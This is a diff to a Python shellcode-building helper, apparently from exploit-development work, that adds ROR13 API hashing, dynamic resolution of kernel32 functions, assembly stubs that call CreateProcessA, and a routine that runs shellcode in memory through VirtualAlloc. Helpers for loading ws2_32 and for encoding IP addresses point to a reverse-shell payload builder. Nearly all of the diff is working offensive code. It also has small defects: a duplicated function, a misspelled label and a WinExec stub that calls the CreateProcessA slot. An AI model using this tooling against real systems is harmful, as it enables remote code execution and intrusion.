@@ -1,10 +1,30 @@
-import struct, socket, sys
-import ctypes, struct, textwrap
+import socket, sys
+import ctypes, struct, numpy
 
 SUCCESS = 'success'
 FAIL = 'fail'
 
-# Helpper functions
+
+def ror_str(byte, count):
+    binb = numpy.base_repr(byte, 2).zfill(32)
+    while count > 0:
+        binb = binb[-1] + binb[0:-1]
+        count -= 1
+    return (int(binb, 2))
+
+def calculate_function_hash(function_name, verbose=False):
+    print_info(f'Generate hash for {function_name}', SUCCESS, 1, verbose)
+    edx = 0x00
+    ror_count = 0
+    for eax in function_name:
+        edx = edx + ord(eax)
+        if ror_count < len(function_name) - 1:
+            edx = ror_str(edx, 0xd)
+        ror_count += 1
+    print_info(f'{hex(edx)} = {function_name}', SUCCESS, 2, verbose)
+    return hex(edx)
+
+# Helper functions
 def print_info(text, status=SUCCESS, level=0, verbose=False):
     if not verbose:
         return
@@ -29,13 +49,19 @@ def print_shellcode(shellcode, language='python', var_name='buf', length=16):
         print(f'"')
 
 def print_asm(asm_string):
+    print(make_print_friendly_asm(asm_string))
+
+
+def make_print_friendly_asm(asm_string):
+    data = ''
     for cmd in asm_string.split(';'):
         if ':' in cmd:
             c = cmd.split(':')
-            print(f'{c[0]}:')
-            print(f'{c[1]:<60};')
+            data += f'{c[0]}:\n'
+            data += f'{c[1]:<60};\n'
         else:
-            print (f'{cmd:<60};')
+            data += f'{cmd:<60};\n'
+    return data
 
 def get_ip_hex(ip_addr):
     try:
@@ -90,7 +116,7 @@ def create_asm_start(force_break=False):
     asm += f"  add     esp, 0xfffff9f0         ;"  #   Extra space to not clobber the stack, we add (0x00 - 0x210) which gets rid of the NULL bytes
     return asm
 
-def find_kernel32_and_resolve_functions():
+def find_kernel32():
     return (
         f"find_kernel32:"
         f"  xor     ecx,ecx                 ;"  #   Zero ECX
@@ -111,7 +137,7 @@ def find_kernel32_and_resolve_functions():
         f"find_function_ret:"  #
         f"  pop esi                         ;"  #   POP the return address from the stack
         f"  mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
-        f"  jmp resolve_symbols_kernel32    ;"  #
+        f"  jmp resolve_kernel32_funcitons   ;"  #
 
         f"find_function_shorten_bnc:"  #   
         f"   call find_function_ret         ;"  #   Relative CALL with negative offset
@@ -165,18 +191,22 @@ def find_kernel32_and_resolve_functions():
         f"find_function_finished:"  #
         f"  popad                           ;"  #   Restore registers
         f"  ret                             ;"  #
-
-        f"resolve_symbols_kernel32:"
-        f"  push  0x78b5b983                ;"  #   TerminateProcess hash
-        f"  call dword ptr [ebp+0x04]       ;"  #   Call find_function
-        f"  mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage
-        f"  push  0xec0e4e8e                ;"  #   LoadLibraryA hash
-        f"  call dword ptr [ebp+0x04]       ;"  #   Call find_function
-        f"  mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later usage
-        f"  push  0x16b3fe72                ;"  #   CreateProcessA hash
-        f"  call dword ptr [ebp+0x04]       ;"  #   Call find_function
-        f"  mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage
     )
+
+def resolve_kernel32_functions(exec_function='CreateProcessA', verbose=False):
+    print_info('Resolving Functions in Kernel32:', SUCCESS, 0, True)
+    function_list = ["TerminateProcess", 'LoadLibraryA', exec_function]
+    resolve_symbols_string = f"resolve_kernel32_funcitons:"
+    counter = 0x10
+    for function_name in function_list:
+        function_hash = calculate_function_hash(function_name, verbose)
+        resolve_symbols_string += (f"  mov eax, {function_hash} ;"
+        f"  call dword ptr [ebp+0x04] ;"
+        f"  mov   [ebp+{hex(counter)}], eax ;")
+        counter += 4
+
+    return resolve_symbols_string
+
     
 def load_ws2_32_and_resolve_symbols():
     return (
@@ -284,7 +314,6 @@ def create_startup_info_a(count):
     )
 
 def add_negated_value(cmd_hex, verbose):
-    
     packed_value = struct.pack('<I', int(cmd_hex, 16))
     print_info(f'{cmd_hex} <E: {''.join(f'\\x{byte:02x}' for byte in packed_value)}', SUCCESS, 2, verbose)
     return (
@@ -297,7 +326,7 @@ def add_negated_value(cmd_hex, verbose):
 def create_command_string(cmd_chunks, count, verbose):
     print_info('Command String Hex:', SUCCESS, 1, verbose)
     asm = f"create_command_string_{count}:"
-    
+
     for index in range(len(cmd_chunks), 0, -1):
         chunk = cmd_chunks[index-1]
         func = chunk.get('func', 'none')
@@ -336,6 +365,39 @@ def create_process_a(count):
         f"  call dword ptr [ebp+0x18]       ;"  #   Call CreateProcessA
     )
 
+
+def create_process_a(count):
+    return (
+        f"call_createprocessa_{count}:"  #
+        f"  mov   eax, esp                  ;"  # Move ESP to EAX
+        f"  xor   ecx, ecx                  ;"  # NULL ECX
+        f"  mov   cx, 0x390                 ;"  # Move 0x390 to CX
+        f"  sub   eax, ecx                  ;"  # Substract CX from EAX to avoid overwriting the structure later
+        f"  push  eax                       ;"  # Push lpProcessInformation
+        f"  push  edi                       ;"  # Push lpStartupInfo
+        f"  xor   eax, eax                  ;"  # NULL EAX   
+        f"  push  eax                       ;"  # Push lpCurrentDirectory
+        f"  push  eax                       ;"  # Push lpEnvironment
+        f"  push  eax                       ;"  # Push dwCreationFlags
+        f"  inc   eax                       ;"  # Increase EAX, EAX = 0x01 (TRUE)
+        f"  push  eax                       ;"  # Push bInheritHandles
+        f"  dec   eax                       ;"  # NULL EAX
+
+        f"  push  eax                       ;"  # Push lpThreadAttributes
+        f"  push  eax                       ;"  # Push lpProcessAttributes
+        f"  push  ebx                       ;"  # Push lpCommandLine
+        f"  push  eax                       ;"  # Push lpApplicationName
+        f"  call dword ptr [ebp+0x18]       ;"  # Call CreateProcessA
+    )
+
+def exec_win(count):
+    return (
+        f"exec_win_{count}:"  #
+        f"  push  ebx                       ;"  # Push lpCmdLine
+        f"  push  eax                       ;"  # Push uCmdShow
+        f"  call dword ptr [ebp+0x18]       ;"  # Call ExecWin
+    )
+
 def execute_shellcode(shellcode):
     ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                               ctypes.c_int(len(shellcode)),
@@ -360,6 +422,25 @@ def execute_shellcode(shellcode):
                                              ctypes.pointer(ctypes.c_int(0)))
 
     op =ctypes.windll.kernel32.GetLastError()
-    print(op)
 
     ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+
+def generate_python_script(asm_code, path):
+    script = (
+    'from keystone import * \n'
+    'import struct\n'
+    'try:\n'
+    f'    asm_code="{asm_code}"\n'
+    '    ks = Ks(KS_ARCH_X86, KS_MODE_32)\n'
+    '    encoding, count = ks.asm(asm_code)\n'
+    '    sh = b""\n'
+    '    for e in encoding:\n'
+    '        sh += struct.pack("B", e)\n'
+    '    shellcode = bytearray(sh)\n'
+    '    for index in range(0,len(shellcode)):\n'
+    '        print(f"\\\\x{shellcode[index]:02x}", end="")\n'
+    'except Exception as e:\n'
+    '    print("Failed to create shellcode:", e)\n')
+
+    with open(path, "w") as file:
+        file.write(script)
